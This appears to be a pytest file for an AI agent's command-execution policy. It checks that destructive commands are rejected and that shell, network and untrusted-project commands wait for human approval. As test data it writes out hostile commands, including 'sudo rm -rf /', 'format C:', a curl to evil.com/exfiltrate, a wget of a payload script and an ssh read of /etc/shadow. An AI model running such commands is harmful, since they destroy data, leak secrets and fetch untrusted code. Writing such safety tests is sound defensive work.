from __future__ import annotations

from pathlib import Path

from rudder.tools.approvals import ApprovalChoice, ApprovalStore
from rudder.tools.execution import (
    ActionClass,
    CommandRequest,
    ExecutionPolicy,
    ExecutionSecurityContext,
)


def test_destructive_commands_strictly_rejected(tmp_path: Path) -> None:
    policy = ExecutionPolicy(tmp_path)

    destructive_cmds = [
        ("sudo", ("rm", "-rf", "/")),
        ("runas", ("/user:Administrator", "cmd")),
        ("rm", ("-rf", "some_dir")),
        ("rmdir", ("/s", "/q", "C:\\")),
        ("del", ("/f", "/q", "*.*")),
        ("format", ("C:", "/fs:NTFS")),
        ("shutdown", ("/s", "/t", "0")),
        ("reboot", ()),
        ("git", ("clean", "-fdx")),
        ("git", ("reset", "--hard", "HEAD~1")),
        ("git", ("restore", "--staged", ".")),
    ]

    for exe, args in destructive_cmds:
        req = CommandRequest(exe, args, tmp_path)
        res = policy.evaluate(req)
        assert res.rejected, f"Expected {exe} {args} to be rejected"
        assert res.action_class in (ActionClass.DESTRUCTIVE, ActionClass.PRIVILEGE)


def test_command_execution_outside_workspace_rejected(tmp_path: Path) -> None:
    workspace = tmp_path / "workspace"
    workspace.mkdir()
    outside = tmp_path / "outside"
    outside.mkdir()

    policy = ExecutionPolicy(workspace)
    req = CommandRequest("pytest", (), outside)
    res = policy.evaluate(req)
    assert res.rejected
    assert res.action_class == ActionClass.DESTRUCTIVE


def test_shell_command_strings_require_approval(tmp_path: Path) -> None:
    policy = ExecutionPolicy(tmp_path)

    shell_exes = ["powershell", "pwsh", "cmd", "cmd.exe", "sh", "bash"]
    for shell in shell_exes:
        req = CommandRequest(shell, ("-c", "echo hello"), tmp_path)
        res = policy.evaluate(req)
        assert res.requires_approval
        assert not res.allowed


def test_network_and_external_commands_require_approval(tmp_path: Path) -> None:
    policy = ExecutionPolicy(tmp_path)

    external_cmds = [
        ("curl", ("https://evil.com/exfiltrate",)),
        ("wget", ("https://evil.com/payload.sh",)),
        ("ssh", ("user@remote", "cat /etc/shadow")),
        ("scp", ("file.txt", "user@remote:")),
        ("git", ("push", "origin", "main")),
        ("git", ("pull", "origin", "main")),
    ]

    for exe, args in external_cmds:
        req = CommandRequest(exe, args, tmp_path)
        res = policy.evaluate(req)
        assert res.requires_approval
        assert res.action_class == ActionClass.EXTERNAL


def test_untrusted_project_commands_require_approval(tmp_path: Path) -> None:
    # Context where project is untrusted
    untrusted_context = ExecutionSecurityContext(trusted_project=False)
    policy = ExecutionPolicy(tmp_path, context=untrusted_context)

    req = CommandRequest("pytest", (), tmp_path)
    res = policy.evaluate(req)
    assert res.requires_approval
    assert not res.allowed

    # When explicitly trusted, safe build/test commands are allowed
    trusted_context = ExecutionSecurityContext(trusted_project=True)
    trusted_policy = ExecutionPolicy(tmp_path, context=trusted_context)
    res_trusted = trusted_policy.evaluate(req)
    assert res_trusted.allowed
    assert not res_trusted.requires_approval


def test_approval_store_allow_once_consumed_and_edit_creates_new_id(tmp_path: Path) -> None:
    store = ApprovalStore()
    req = CommandRequest("cargo", ("test",), tmp_path)

    # Allow once
    dec = store.decide(req, ApprovalChoice.ALLOW_ONCE)
    assert dec.choice == ApprovalChoice.ALLOW_ONCE
    # is_allowed returns True and consumes the ALLOW_ONCE grant
    assert store.is_allowed(req)
    # Subsequent call without approval is disallowed
    assert not store.is_allowed(req)

    # Edit creates distinct command request
    edit_dec = store.decide(
        req,
        ApprovalChoice.EDIT,
        edited=("cargo", ("test", "--", "test_math")),
    )
    assert edit_dec.request.request_id != req.request_id
    assert edit_dec.request.arguments == ("test", "--", "test_math")
